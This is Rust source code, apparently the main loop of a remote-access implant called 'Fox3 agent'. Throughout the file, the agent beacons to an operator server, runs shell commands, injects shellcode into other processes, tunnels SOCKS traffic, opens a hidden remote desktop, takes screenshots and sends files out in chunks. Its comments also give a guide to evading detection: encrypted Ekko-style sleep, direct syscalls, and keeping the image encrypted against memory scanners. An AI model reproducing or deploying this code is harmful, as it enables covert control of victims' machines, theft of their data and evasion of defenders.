/// Fox3 agent — async tunnel loop with interruptible obfuscated sleep.
///
/// # Architecture overview
///
/// ```text
/// ┌─────────────────────────────────────────────────────────────────────────┐
/// │  Main thread                                                             │
/// │                                                                          │
/// │  ┌──────────────┐   wake signal   ┌──────────────────────────────────┐  │
/// │  │ Obfuscated   │◄────────────────│ Background TCP reader threads    │  │
/// │  │ sleep        │                 │ (one per active SOCKS connection) │  │
/// │  └──────┬───────┘                 └──────────────────────────────────┘  │
/// │         │ wake (timeout or early)                                        │
/// │         ▼                                                                │
/// │  drain_outbound() ─── collect TCP→server data buffered by readers       │
/// │  build checkin msg   ─ SOCKS results + file-transfer chunks + results   │
/// │  POST to server                                                          │
/// │  handle response     ─ dispatch SOCKS jobs, file-transfer, control      │
/// └─────────────────────────────────────────────────────────────────────────┘
/// ```
///
/// # Sleep modes
///
/// **Normal mode** (idle — no interactive operations):
///   `sleep_or_listen()` — full Ekko encrypted sleep (Windows) or
///   `WakeSignal::wait()` (non-Windows) with ±jitter.  PE image is
///   XOR-encrypted during the wait.  WSS push wakes instantly via
///   kernel-level WSAEventSelect.
///
/// **Interactive mode** (SOCKS, rportfwd, or file transfer active):
///   Zero sleep — the agent runs a tight loop.  Network I/O (POST
///   round-trip) provides natural pacing.  Cold PE sections (headers,
///   .reloc, .rsrc, .pdata) stay encrypted to reduce scanner visibility.
///   Normal one-off commands (whoami, dir, etc.) do NOT trigger this mode.
///   Mode transitions are logged with clear start/stop markers.
///
/// # Sleep obfuscation — implementation guide
///
/// The current `obfuscated_sleep()` is cross-platform (Condvar) and applies
/// jitter to make beacon intervals variable.  For production agents replace the
/// body of `obfuscated_sleep()` with one of the following strategies while
/// keeping the same `WakeSignal` interrupt interface:
///
/// **1. Encrypted sleep duration (static-analysis evasion)**
/// ```text
/// Store `sleep_ms` XOR-encrypted in a .data variable.
/// At runtime: actual_ms = encrypted_val ^ runtime_key
/// Use a key derived at startup (e.g., hash of first instruction's address).
/// Still call Condvar::wait_timeout with the decrypted value.
/// ```
///
/// **2. Windows — WaitForSingleObjectEx (alertable wait)**
/// ```text
/// Create an auto-reset Event handle (CreateEventW).
/// Sleep: WaitForSingleObjectEx(event, jittered_millis, TRUE)
///   - Alertable=TRUE lets the thread process APCs while sleeping.
/// Wake: SetEvent(event)            (called by notify())
/// Combine with Ekko/Foliage-style sleep obfuscation:
///   - Queue ROP/APC that: encrypts agent image → sleeps → decrypts → SetEvent
///   - Call SleepEx(jittered_millis, TRUE) so the APC fires during sleep
///   - Agent image is encrypted while sleeping; not visible in memory scans
/// ```
///
/// **3. Windows — NtDelayExecution (direct syscall)**
/// ```text
/// Resolve NtDelayExecution via direct syscall stub or PEB walking.
/// Interval = LARGE_INTEGER (100ns units, negative = relative).
/// Store the interval XOR-encrypted; decrypt immediately before the call.
/// No Win32 Sleep() fingerprint in the import table.
/// ```
///
/// **4. Linux — nanosleep + signal-based interrupt**
/// ```text
/// Use libc::nanosleep with a timespec derived from the jittered duration.
/// For early wake: send SIGALRM to self; nanosleep returns EINTR.
/// Pair with seccomp filtering to restrict syscalls during sleep.
/// ```
///
/// # Tunnel transport notes by protocol
///
/// **WSS**: Push goroutine on the server delivers jobs immediately.  The agent's
///   read loop receives packets without polling.  No sleep mode change needed;
///   data arrives as fast as the network allows.
///
/// **HTTPS/HTTP**: All pending jobs are batched into a single response per POST.
///   In tunnel mode the agent polls at `tunnel_poll` interval (default 50 ms).
///   Server delivers all queued SOCKS packets in one response.
///   Throughput ≈ (MTU × batch_size) / (RTT + tunnel_poll_ms).
///
/// **DoH**: Same semantics as HTTPS.  Response encodes data as AAAA records
///   (16 bytes each, compact) or TXT (255-byte strings, larger payload).
///   Use AAAA for tunnel data; TXT as fallback for large bursts.
///   Max batch per round-trip ≈ 10 AAAA records × 16 B = 160 B uplink,
///   server response can carry many more AAAA records.
///
/// **DNS**: Most constrained transport (~220 bytes per query subdomain after
///   encoding overhead).  Tunnel mode polls at tunnel_poll (e.g. 50 ms).
///   Throughput ≈ 220 B / 50 ms ≈ ~3.5 KB/s.  Adequate for SOCKS5 CONNECT
///   handshakes and light interactive traffic; not suitable for bulk transfers.
///   Prefer DoH or HTTPS for upload/download jobs.

use std::io::Read;
use std::process;
use std::time::{Duration, Instant};

use rand::Rng;
use serde_json::Value;
use uuid::Uuid;

use simple_agent::exec;
use crate::ekko::EkkoSleep;
use crate::hvnc::HvncSession;
use crate::pipeline;
use crate::protocol::*;
use crate::rportfwd::RPortFwdManager;
use crate::screenshot;
use crate::shellcode;
use crate::socks::{SocksManager, WakeSignal};
use crate::transport::Transport;

// ── Chunk size for file downloads (agent → server) ────────────────────────────
//
// Keep chunks well within the HTTP body limit (server allows 10 MB).
// For DNS/DoH use a much smaller value since subdomain space is tiny.
// A single HTTPS checkin can carry multiple megabytes; 1 MB is a safe default.
const DOWNLOAD_CHUNK_BYTES: usize = 1024 * 1024; // 1 MiB

// ── Agent ─────────────────────────────────────────────────────────────────────

pub struct Agent {
    pub id:            Uuid,
    pub transport:     Transport,
    pub psk:           String,
    pub session_token: Option<String>,

    /// Base sleep interval (before jitter is applied).
    pub sleep: Duration,

    /// Jitter percentage applied to `sleep`.  0 = no jitter, 30 = ±30%.
    /// Actual sleep = sleep_ms ± (sleep_ms * jitter_pct / 100), floor 50 ms.
    pub jitter_pct: u8,

    /// Fast-poll interval (legacy, kept for CLI compatibility).
    /// Interactive mode now uses zero-sleep with network I/O pacing.
    #[allow(dead_code)]
    pub tunnel_poll: Duration,

    /// Shared wake signal — background TCP reader threads call notify() here
    /// to interrupt the main loop's sleep early when new data is ready.
    wake: WakeSignal,

    /// SOCKS5 connection manager (single-threaded, owned by main loop).
    socks: SocksManager,

    /// Reverse port-forward manager (agent binds port, relays to server).
    rportfwd: RPortFwdManager,

    /// Pending result jobs to deliver on the next checkin
    /// (file-transfer chunks, command results queued from previous iteration).
    pending_results: Vec<Job>,

    /// Maximum random padding length in bytes.
    padding_max: usize,

    /// Maximum number of failed checkins before the agent exits.
    max_retry: u32,

    /// Kill date: agent exits after this time (None = no kill date).
    kill_date: Option<std::time::SystemTime>,

    /// Tracks when we last sent a full checkin (for keepalive timer).
    /// WSS push listening skips idle checkins; this ensures we still send
    /// periodic keepalives to satisfy the server's agent alive timeout.
    last_checkin: Instant,

    /// Ekko sleep encryption (Windows only).  Encrypts the PE image during sleep.
    ekko: Option<EkkoSleep>,

    /// Whether we are currently in interactive mode (SOCKS, rportfwd,
    /// or file transfer active).  Tracked to log clean start/stop transitions
    /// and manage cold section encryption state.
    interactive_active: bool,

    /// HVNC session (hidden desktop streaming). Active when operator starts HVNC.
    hvnc: Option<HvncSession>,
}

impl Agent {
    #[allow(dead_code)]
    pub fn new(
        transport:   Transport,
        psk:         String,
        sleep:       Duration,
        jitter_pct:  u8,
        tunnel_poll: Duration,
    ) -> Self {
        Self::new_with_id(Uuid::new_v4(), transport, psk, sleep, jitter_pct, tunnel_poll)
    }

    pub fn new_with_id(
        id:          Uuid,
        transport:   Transport,
        psk:         String,
        sleep:       Duration,
        jitter_pct:  u8,
        tunnel_poll: Duration,
    ) -> Self {
        let wake = WakeSignal::new().expect("WakeSignal creation failed — cannot start agent");
        let ekko = if sleep >= Duration::from_secs(60) {
            let e = EkkoSleep::new();
            if e.is_some() {
                crate::dbg_print!("[agent] Ekko sleep encryption enabled (sleep >= 60s)");
            }
            e
        } else {
            crate::dbg_print!("[agent] Ekko disabled (sleep < 60s)");
            None
        };
        let socks = SocksManager::new();
        let rportfwd = RPortFwdManager::new(
            socks.outbound_queue(),
            wake.clone_ref(),
            id,
        );
        Self {
            id,
            transport,
            psk,
            session_token:   None,
            sleep,
            jitter_pct,
            tunnel_poll,
            wake,
            socks,
            rportfwd,
            pending_results:    Vec::new(),
            padding_max:        4096,
            max_retry:          7,
            kill_date:          None,
            last_checkin:       Instant::now(),
            ekko,
            interactive_active: false,
            hvnc: None,
        }
    }

    // ── Main beacon loop ──────────────────────────────────────────────────────

    /// Run the main beacon loop.
    ///
    /// Loop invariant:
    ///   1. Determine sleep mode (tunnel-fast-poll vs obfuscated sleep).
    ///   2. Sleep (interruptible).
    ///   3. Collect all pending outbound data (SOCKS, transfers, results).
    ///   4. POST one checkin that carries everything.
    ///   5. Dispatch received jobs; return to step 1.
    pub fn run(&mut self) -> anyhow::Result<()> {
        // First checkin carries AgentInfo so the server registers the agent.
        // Retry until the listener is up — a transport error here is not fatal.
        loop {
            match self.build_checkin(true).and_then(|msg| self.checkin(msg)) {
                Ok(resp) => { self.handle_response(resp)?; break; }
                Err(e)   => {
                    crate::dbg_print!("[agent] initial checkin failed (retrying): {}", e);
                    self.obfuscated_sleep();
                }
            }
        }

        let mut push_handled;
        let mut loop_count: u64 = 0;
        let mut mainloop_fps_timer = Instant::now();
        let mut mainloop_frames_out: u32 = 0;
        let mut mainloop_checkins: u32 = 0;
        let mut mainloop_inbound_jobs: u32 = 0;
        loop {
            push_handled = false;
            let loop_start = Instant::now();
            // Main loop FPS monitor
            if mainloop_fps_timer.elapsed().as_secs() >= 1 {
                crate::dbg_print!("[mainloop-fps] frames_out={} checkins={} inbound_jobs={}",
                    mainloop_frames_out, mainloop_checkins, mainloop_inbound_jobs);
                mainloop_frames_out = 0;
                mainloop_checkins = 0;
                mainloop_inbound_jobs = 0;
                mainloop_fps_timer = Instant::now();
            }
            // ── Kill date check ───────────────────────────────────────────────
            if let Some(kd) = self.kill_date {
                if std::time::SystemTime::now() >= kd {
                    process::exit(0);
                }
            }

            // ── Step 1: choose sleep mode ─────────────────────────────────────
            //
            // Interactive operations: SOCKS, rportfwd, file transfer.
            // These are streaming/bidirectional and
            // need continuous processing — sleeping makes no sense.
            //
            // Normal tasks (whoami, dir, shell commands, agentInfo, etc.)
            // do NOT trigger interactive mode — they complete inline and
            // the agent resumes its normal encrypted sleep cycle.
            // SOCKS connections and pending file-transfer chunks require
            // the main loop to run without sleeping.
            let has_interactive = self.socks.has_active()
                || self.rportfwd.has_active()
                || !self.pending_results.is_empty()
                || self.hvnc.is_some();

            if has_interactive {
                // ── Interactive mode: no sleep, cold sections encrypted ────
                //
                // The agent runs a tight loop — network I/O (POST round-trip)
                // provides natural pacing.  Unused PE metadata (headers,
                // .reloc, .rsrc, .pdata) stays encrypted to reduce the
                // in-memory footprint visible to scanners.
                if !self.interactive_active {
                    crate::dbg_print!("[agent] interactive mode started (SOCKS/rportfwd/transfer active)");
                    if let Some(ref ekko) = self.ekko {
                        ekko.encrypt_cold();
                    }
                    self.interactive_active = true;
                }
                // No sleep — proceed directly to collect and send data.
            } else {
                // ── Normal mode: full Ekko encrypted sleep ────────────────
                if self.interactive_active {
                    crate::dbg_print!("[agent] interactive mode ended — resuming encrypted sleep");
                    // Decrypt cold sections before full Ekko sleep (Ekko encrypts
                    // ALL regions including cold ones — they must be in plaintext).
                    if let Some(ref ekko) = self.ekko {
                        ekko.decrypt_cold();
                    }
                    self.interactive_active = false;
                }
                // Push-aware encrypted sleep.
                // Listens for server-pushed WSS frames while waiting.
                // Falls through for non-WSS transports (try_recv returns Ok(None)).
                // Returns true if a push was received and handled inline.
                push_handled = self.sleep_or_listen();
            }

            let t_after_sleep = Instant::now();

            // ── Step 2: collect outbound data ─────────────────────────────────
            // a) TCP→server data from background SOCKS reader threads
            let mut outbound: Vec<Job> = self.socks
                .drain_outbound()
                .into_iter()
                .map(|s| s.into_job())
                .collect();

            // b) Pending results from previous iterations (file chunks, etc.)
            outbound.append(&mut self.pending_results);

            // ── Step 3: decide whether to checkin ─────────────────────────────
            // Skip the redundant poll checkin unless:
            //   - There is outbound data to deliver (SOCKS, file chunks, HVNC frames)
            //   - Keepalive/poll timer expired
            let poll_interval = if has_interactive {
                self.tunnel_poll
            } else {
                self.sleep * 3
            };
            let poll_due = self.last_checkin.elapsed() > poll_interval;
            if outbound.is_empty() && !poll_due {
                // Yield briefly to avoid busy-spinning
                if has_interactive {
                    std::thread::sleep(std::time::Duration::from_millis(5));
                }
                continue;
            }

            let outbound_count = outbound.len();
            mainloop_frames_out += outbound_count as u32;
            mainloop_checkins += 1;
            let outbound_bytes: usize = outbound.iter().map(|j| {
                j.payload.as_ref().map(|p| p.to_string().len()).unwrap_or(0)
            }).sum();

            let msg = match if outbound.is_empty() {
                self.build_checkin(false)
            } else {
                self.build_jobs_message(outbound)
            } {
                Ok(m)  => m,
                Err(e) => { crate::dbg_print!("[agent] build message error: {}", e); continue; }
            };

            let t_before_checkin = Instant::now();
            let response = match self.checkin(msg) {
                Ok(r)  => r,
                Err(e) => {
                    crate::dbg_print!("[agent] checkin error: {}", e);
                    // Clear stale session token so the next attempt uses a fresh PSK JWT.
                    // Without this, an expired or revoked server-issued JWT causes a permanent 401 loop.
                    self.session_token = None;
                    continue;
                }
            };
            let t_after_checkin = Instant::now();

            self.last_checkin = Instant::now();

            if let Err(e) = self.handle_response(response) {
                crate::dbg_print!("[agent] handle_response error: {}", e);
            }

            loop_count += 1;
            if has_interactive && loop_count % 500 == 1 {
                let total = loop_start.elapsed();
                let sleep_time = t_after_sleep.duration_since(loop_start);
                let build_time = t_before_checkin.duration_since(t_after_sleep);
                let checkin_time = t_after_checkin.duration_since(t_before_checkin);
                let handle_time = total.saturating_sub(sleep_time + build_time + checkin_time);
                crate::dbg_print!(
                    "[timing] loop={} total={:?} sleep={:?} build={:?} checkin={:?} handle={:?} out={}/{}B",
                    loop_count, total, sleep_time, build_time, checkin_time, handle_time,
                    outbound_count, outbound_bytes,
                );
            }
        }
    }

    // ── Sleep ─────────────────────────────────────────────────────────────────

    /// Encrypted sleep: XOR-encrypts the PE image, waits, then decrypts.
    ///
    /// Uses Ekko page-skip approach on Windows: the encrypt/wait/decrypt stub
    /// lives on a single 4KB page that is excluded from encryption.  All other
    /// .text, .rdata, .data pages are XORed with a random 16-byte key.
    ///
    /// If a WSS connection is active, the kernel monitors the socket via
    /// WSAEventSelect — the agent wakes instantly on server push even while
    /// memory is encrypted (no user-mode code executes during the wait).
    ///
    /// Falls back to WakeSignal::wait() if Ekko is unavailable (non-Windows).
    fn obfuscated_sleep(&self) {
        let actual = self.jittered_duration();

        if let Some(ref ekko) = self.ekko {
            // Get WSS socket handle for push-wake (None if not connected)
            let wss_socket = self.transport.raw_wss_socket();
            ekko.encrypted_wait(actual, self.wake.handle(), wss_socket);
        } else {
            self.wake.wait(actual);
        }
    }

    /// Push-aware encrypted sleep with inline WSS data handling.
    ///
    /// If the Ekko encrypted wait woke because WSS data arrived (kernel
    /// signaled the socket event), we drain the pushed frame and process it
    /// inline — preserving the same behavior as the old try_recv path.
    ///
    /// For non-Ekko / non-WSS, falls back to the old try_recv approach.
    /// Returns `true` if a server-pushed message was received and handled.
    fn sleep_or_listen(&mut self) -> bool {
        let total = self.jittered_duration();

        if let Some(ref ekko) = self.ekko {
            crate::dbg_print!("[sleep] ekko wait {}ms", total.as_millis());
            let wss_socket = self.transport.raw_wss_socket();
            let result = ekko.encrypted_wait(total, self.wake.handle(), wss_socket);
            crate::dbg_print!("[sleep] ekko => {:?}", result);

            // Always drain buffered WSS data after waking, regardless of wake
            // reason.  WSAEventSelect is edge-triggered: it fires once when data
            // arrives but won't re-fire for the same buffered bytes.  If the
            // agent woke on Timeout (timer/wake signal) while a server ping was
            // already buffered, we must still call try_recv so tungstenite reads
            // the ping and auto-sends the pong.  Without this, the server's pong
            // deadline expires and it closes the connection.
            if self.transport.supports_push() {
                match self.transport.try_recv(Duration::from_millis(100)) {
                    Ok(Some(data)) => {
                        match pipeline::decrypt_message(&data, &self.psk) {
                            Ok(msg) => {
                                if let Err(e) = self.handle_response(msg) {
                                    crate::dbg_print!("[agent] push handle_response error: {}", e);
                                }
                            }
                            Err(e) => {
                                crate::dbg_print!("[agent] push decrypt error: {}", e);
                            }
                        }
                        self.last_checkin = Instant::now();
                        return true;
                    }
                    Ok(None) => {} // Ping-only or timeout — pong was auto-sent
                    Err(e) => {
                        crate::dbg_print!("[sleep] try_recv error: {}", e);
                    }
                }
            }
            return false;
        }

        // ── Fallback: no Ekko (non-Windows) ──────────────────────────────────
        if !self.transport.supports_push() {
            self.wake.wait(total);
            return false;
        }

        match self.transport.try_recv(total) {
            Ok(Some(data)) => {
                match pipeline::decrypt_message(&data, &self.psk) {
                    Ok(msg) => {
                        if let Err(e) = self.handle_response(msg) {
                            crate::dbg_print!("[agent] push handle_response error: {}", e);
                        }
                    }
                    Err(e) => {
                        crate::dbg_print!("[agent] push decrypt error: {}", e);
                    }
                }
                self.last_checkin = Instant::now();
                true
            }
            Ok(None) => false,
            Err(_) => false,
        }
    }

    /// Compute sleep_ms ± (sleep_ms × jitter_pct / 100), floor 50 ms.
    ///
    /// Example: sleep=5s, jitter=30 → actual ∈ [3500 ms, 6500 ms].
    fn jittered_duration(&self) -> Duration {
        if self.jitter_pct == 0 {
            return self.sleep;
        }
        let base_ms   = self.sleep.as_millis() as i64;
        let max_delta = base_ms * self.jitter_pct as i64 / 100;
        let delta: i64 = rand::thread_rng().gen_range(-max_delta..=max_delta);
        let actual_ms = (base_ms + delta).max(50) as u64;
        Duration::from_millis(actual_ms)
    }

    // ── Transport ─────────────────────────────────────────────────────────────

    /// Encrypt `msg` and POST it; decrypt and return the server's response.
    fn checkin(&self, msg: Base) -> anyhow::Result<Base> {
        let auth = match &self.session_token {
            Some(tok) => pipeline::build_auth_header_from_token(tok),
            None      => pipeline::build_auth_jwt(self.id, &self.psk)?,
        };
        let ciphertext     = pipeline::encrypt_message(&msg, &self.psk)?;
        let response_bytes = self.transport.post(auth, ciphertext)?;
        let result = pipeline::decrypt_message(&response_bytes, &self.psk)?;
        Ok(result)
    }

    // ── Response dispatch ─────────────────────────────────────────────────────

    /// Handle a server response: update session token, dispatch each job.
    fn handle_response(&mut self, msg: Base) -> anyhow::Result<()> {
        if let Some(tok) = &msg.token {
            if !tok.is_empty() {
                self.session_token = Some(tok.clone());
            }
        }

        match msg.msg_type {
            MSG_IDLE => {}
            MSG_JOBS => {
                let jobs   = parse_jobs(msg.payload)?;
                let mut results: Vec<Job> = Vec::new();

                for job in jobs {
                    match job.job_type {
                        JOB_OK => {}

                        // ── Shell / process execution ─────────────────────────
                        JOB_CMD => {
                            results.push(self.run_cmd(&job)?);
                        }

                        // ── Agent info request ────────────────────────────────
                        JOB_AGENTINFO => {
                            results.push(self.build_agentinfo_result(&job));
                        }

                        // ── Control: sleep, jitter, kill, agentInfo, etc. ─────
                        JOB_CONTROL => {
                            if let Some(r) = self.handle_control(&job)? {
                                results.push(r);
                            }
                        }

                        // ── Native OS commands ────────────────────────────────
                        // cd, pwd, ls, env, rm, touch, killprocess, ifconfig,
                        // nslookup, sdelete.
                        JOB_NATIVE => {
                            results.push(self.run_native(&job));
                        }

                        // ── Module commands ───────────────────────────────────
                        // ps, netstat, uptime, memory, memfd, pipes, etc.
                        JOB_MODULE => {
                            results.push(self.run_module(&job));
                        }

                        // ── Shellcode execution ───────────────────────────────
                        // self / remote / rtlcreateuserthread / userapc
                        JOB_SHELLCODE => {
                            results.push(self.run_shellcode(&job));
                        }

                        // ── SOCKS / rportfwd / HVNC ─────────────────────────
                        // Check HVNC first (input relay to hidden desktop),
                        // then rportfwd (agent-initiated connections),
                        // then fall through to SocksManager (server-initiated).
                        JOB_SOCKS => {
                            // HVNC input: route to hidden desktop session
                            let mut handled = false;
                            if let Some(ref hvnc) = self.hvnc {
                                if let Some(payload) = &job.payload {
                                    match serde_json::from_value::<SocksPayload>(payload.clone()) {
                                        Ok(sp) => {
                                            let sid = sp.id;
                                            let hvnc_cid = hvnc.conn_id();
                                            if sid == hvnc_cid {
                                                let data = sp.decode_data();
                                                crate::dbg_print!("[hvnc-input] received {} bytes, type=0x{:02x}", data.len(), data.first().copied().unwrap_or(0));
                                                hvnc.handle_input(&data);
                                                handled = true;
                                            } else {
                                                crate::dbg_print!("[hvnc-debug] SOCKS id mismatch: got={} hvnc={}", sid, hvnc_cid);
                                            }
                                        }
                                        Err(e) => {
                                            crate::dbg_print!("[hvnc-debug] SOCKS deser error: {}, payload={}", e, payload);
                                        }
                                    }
                                } else {
                                    crate::dbg_print!("[hvnc-debug] JOB_SOCKS with no payload");
                                }
                            }
                            if !handled {
                                if !RPortFwdManager::handle_incoming(&job) {
                                    let immediate = self.socks.handle_incoming(&job, &self.wake);
                                    results.extend(immediate);
                                }
                            }
                        }

                        // ── File transfer ─────────────────────────────────────
                        // download=true  → server→agent upload (agent writes).
                        // download=false → agent→server download (agent reads,
                        //   chunks, queues in pending_results → drives tunnel mode).
                        JOB_FILETRANSFER => {
                            match self.handle_file_transfer(&job) {
                                Ok(Some(r)) => results.push(r),
                                Ok(None)    => {}
                                Err(e)      => results.push(make_result(
                                    self.id, &job, String::new(), e.to_string()
                                )),
                            }
                        }

                        _ => {
                            results.push(make_result(
                                self.id, &job, String::new(),
                                format!("unsupported job type {}", job.job_type),
                            ));
                        }
                    }
                }

                if !results.is_empty() {
                    let reply = self.build_jobs_message(results)?;
                    // Process the server's response — it may contain new jobs
                    // (e.g. SOCKS data queued while we were sending results).
                    // Without this, jobs returned in the response are lost because
                    // GetJobs() already consumed them from transientJobs.
                    if let Ok(resp) = self.checkin(reply) {
                        self.handle_response(resp)?;
                    }
                }
            }
            _ => {}
        }
        Ok(())
    }

    // ── Shellcode execution ───────────────────────────────────────────────────

    fn run_shellcode(&self, job: &Job) -> Job {
        let result = (|| -> anyhow::Result<String> {
            let sc: Shellcode = job.payload.as_ref()
                .and_then(|v| serde_json::from_value(v.clone()).ok())
                .ok_or_else(|| anyhow::anyhow!("malformed Shellcode payload"))?;

            let bytes    = sc.decode_bytes();
            let bof_args = sc.decode_bof_args();
            shellcode::execute(&sc.method, &bytes, sc.pid, &bof_args)
        })();

        match result {
            Ok(msg)  => make_result(self.id, job, msg, String::new()),
            Err(e)   => make_result(self.id, job, String::new(), e.to_string()),
        }
    }

    // ── Native OS commands ────────────────────────────────────────────────────

    fn run_native(&mut self, job: &Job) -> Job {
        let (cmd, args) = extract_command(job);
        // Commands that need &mut self (rportfwd, screenshot)
        match cmd.as_str() {
            "rportfwd_start" => {
                let port: u16 = args.first()
                    .and_then(|s| s.parse().ok())
                    .unwrap_or(0);
                if port == 0 {
                    return make_result(self.id, job, String::new(),
                        "rportfwd_start: valid port required".to_string());
                }
                match self.rportfwd.start(port) {
                    Ok(msg)  => return make_result(self.id, job, msg, String::new()),
                    Err(msg) => return make_result(self.id, job, String::new(), msg),
                }
            }
            "rportfwd_stop" => {
                let msg = self.rportfwd.stop();
                return make_result(self.id, job, msg, String::new());
            }
            "hvnc_start" => {
                if self.hvnc.is_some() {
                    return make_result(self.id, job, String::new(), "HVNC already active".into());
                }
                let quality = args.first().and_then(|s| s.parse::<u8>().ok()).unwrap_or(50);
                match HvncSession::start(
                    self.socks.outbound_queue(),
                    self.wake.clone_ref(),
                    self.id,
                    quality,
                ) {
                    Ok(session) => {
                        let cid = session.conn_id().to_string();
                        self.hvnc = Some(session);
                        return make_result(self.id, job,
                            format!("HVNC started, conn_id={}", cid), String::new());
                    }
                    Err(e) => {
                        return make_result(self.id, job, String::new(), e);
                    }
                }
            }
            "hvnc_stop" => {
                if let Some(session) = self.hvnc.take() {
                    session.stop();
                    return make_result(self.id, job, "HVNC stopped".into(), String::new());
                } else {
                    return make_result(self.id, job, String::new(), "HVNC not active".into());
                }
            }
            "screenshot" => {
                match screenshot::capture() {
                    Ok(bmp_data) => {
                        use base64::Engine as _;
                        let b64 = base64::engine::general_purpose::STANDARD.encode(&bmp_data);
                        return make_result(self.id, job, b64, String::new());
                    }
                    Err(e) => {
                        return make_result(self.id, job, String::new(), e);
                    }
                }
            }
            _ => {}
        }
        let (stdout, stderr) = match native_cmd(&cmd, &args) {
            Ok(out) => (out, String::new()),
            Err(e)  => (String::new(), e.to_string()),
        };
        make_result(self.id, job, stdout, stderr)
    }

    // ── Module commands ───────────────────────────────────────────────────────

    fn run_module(&self, job: &Job) -> Job {
        let (cmd, args) = extract_command(job);
        let (stdout, stderr) = match module_cmd(&cmd, &args) {
            Ok(out) => (out, String::new()),
            Err(e)  => (String::new(), e.to_string()),
        };
        make_result(self.id, job, stdout, stderr)
    }

    // ── File transfer ─────────────────────────────────────────────────────────

    /// Handle a `JOB_FILETRANSFER` job.
    ///
    /// Upload (download=true): write blob to disk, no result needed.
    /// Download (download=false): read file and split into DOWNLOAD_CHUNK_BYTES
    ///   chunks.  The first chunk is returned immediately; remaining chunks are
    ///   queued in `pending_results`, which keeps `has_tunnel = true` so the
    ///   loop stays in fast-poll mode until all chunks are delivered.
    fn handle_file_transfer(&mut self, job: &Job) -> anyhow::Result<Option<Job>> {
        let ft: FileTransfer = match job.payload.as_ref()
            .and_then(|v| serde_json::from_value(v.clone()).ok())
        {
            Some(f) => f,
            None    => anyhow::bail!("malformed FileTransfer payload"),
        };

        if ft.is_download {
            // Server → agent: write blob to disk
            let data = ft.decode_blob();
            std::fs::write(&ft.file_location, &data)?;
            return Ok(None);
        }

        // Agent → server: read and chunk
        let mut file = std::fs::File::open(&ft.file_location)?;
        let mut buf  = Vec::new();
        file.read_to_end(&mut buf)?;

        let chunks: Vec<&[u8]> = buf.chunks(DOWNLOAD_CHUNK_BYTES).collect();

        // Queue chunks 1+ for future checkins.
        // pending_results being non-empty keeps the loop in fast-poll until done.
        for chunk in chunks.iter().skip(1) {
            let ft_chunk = FileTransfer::encode_result(ft.file_location.clone(), chunk);
            self.pending_results.push(Job {
                agent_id: self.id,
                id:       job.id.clone(),
                token:    job.token,
                job_type: JOB_FILETRANSFER,
                payload:  serde_json::to_value(ft_chunk).ok(),
            });
        }

        // Return chunk 0 immediately
        let first = chunks.first().copied().unwrap_or(&[]);
        let ft_r  = FileTransfer::encode_result(ft.file_location, first);
        Ok(Some(Job {
            agent_id: self.id,
            id:       job.id.clone(),
            token:    job.token,
            job_type: JOB_FILETRANSFER,
            payload:  serde_json::to_value(ft_r).ok(),
        }))
    }

    // ── Control jobs ──────────────────────────────────────────────────────────

    /// Handle a CONTROL job.  Returns `Some(Job)` when the control command
    /// requires an immediate response (e.g., `agentInfo`), `None` otherwise.
    fn handle_control(&mut self, job: &Job) -> anyhow::Result<Option<Job>> {
        let (cmd, args) = extract_command(job);
        match cmd.to_lowercase().as_str() {
            // ── Timing ────────────────────────────────────────────────────────
            "sleep" => {
                if let Some(s) = args.first() {
                    if let Ok(secs) = s.trim_end_matches('s').parse::<u64>() {
                        self.sleep = Duration::from_secs(secs);
                        // Enable/disable Ekko based on new sleep duration
                        if secs >= 60 && self.ekko.is_none() {
                            self.ekko = EkkoSleep::new();
                            if self.ekko.is_some() {
                                crate::dbg_print!("[agent] Ekko enabled (sleep >= 60s)");
                            }
                        } else if secs < 60 && self.ekko.is_some() {
                            crate::dbg_print!("[agent] Ekko disabled (sleep < 60s)");
                            self.ekko = None;
                        }
                    }
                }
            }
            "skew" => {
                if let Some(s) = args.first() {
                    if let Ok(pct) = s.parse::<u8>() {
                        self.jitter_pct = pct.min(50);
                    }
                }
            }

            // ── Kill date ─────────────────────────────────────────────────────
            // Server sends: killdate <unix-epoch-seconds>
            "killdate" => {
                if let Some(s) = args.first() {
                    if let Ok(epoch) = s.parse::<u64>() {
                        self.kill_date = Some(
                            std::time::UNIX_EPOCH + Duration::from_secs(epoch)
                        );
                    }
                }
            }

            // ── Retry limit ───────────────────────────────────────────────────
            "maxretry" => {
                if let Some(s) = args.first() {
                    if let Ok(n) = s.parse::<u32>() {
                        self.max_retry = n;
                    }
                }
            }

            // ── Padding ───────────────────────────────────────────────────────
            "padding" => {
                if let Some(s) = args.first() {
                    if let Ok(n) = s.parse::<usize>() {
                        self.padding_max = n;
                    }
                }
            }

            // ── Agent info ────────────────────────────────────────────────────
            // Server issues `agentInfo` as a CONTROL command; agent must respond
            // with a JOB_AGENTINFO payload carrying current configuration.
            "agentinfo" => {
                return Ok(Some(self.build_agentinfo_result(job)));
            }

            // ── Terminate ─────────────────────────────────────────────────────
            "kill" | "exit" => {
                process::exit(0);
            }

            // ── Connection change (stub) ──────────────────────────────────────
            // Full implementation: parse new URL/listener ID and reconnect.
            "changelistener" | "connect" | "initialize" => {}

            // ── TLS / JA3 (stub) ─────────────────────────────────────────────
            "ja3" | "parrot" => {}

            _ => {
                return Ok(Some(make_result(
                    self.id, job, String::new(),
                    format!("unknown control command: '{}'. Valid: sleep, skew, killdate, maxretry, padding, agentinfo, exit, kill, changelistener, connect, initialize, ja3, parrot", cmd),
                )));
            }
        }
        Ok(None)
    }

    // ── Message builders ──────────────────────────────────────────────────────

    fn build_checkin(&self, include_info: bool) -> anyhow::Result<Base> {
        let payload = if include_info {
            Some(serde_json::to_value(AgentInfo {
                version:    Some("0.1.0".into()),
                build:      Some("simple_agent".into()),
                waittime:   Some(format!("{}s", self.sleep.as_secs())),
                paddingmax: Some(self.padding_max as i32),
                maxretry:   Some(self.max_retry as i32),
                proto:      Some("https".into()),
                sysinfo:    Some(SysInfo {
                    platform:     Some(std::env::consts::OS.to_string()),
                    architecture: Some(std::env::consts::ARCH.to_string()),
                    username:     username(),
                    hostname:     hostname(),
                    pid:          Some(process::id() as i32),
                    ips:          local_ips(),
                }),
            })?)
        } else {
            None
        };
        Ok(Base {
            id:        self.id,
            msg_type:  MSG_CHECKIN,
            payload,
            padding:   random_padding(self.padding_max),
            token:     self.session_token.clone(),
            delegates: None,
        })
    }

    fn build_jobs_message(&self, jobs: Vec<Job>) -> anyhow::Result<Base> {
        Ok(Base {
            id:        self.id,
            msg_type:  MSG_JOBS,
            payload:   Some(serde_json::to_value(jobs)?),
            padding:   random_padding(self.padding_max),
            token:     self.session_token.clone(),
            delegates: None,
        })
    }

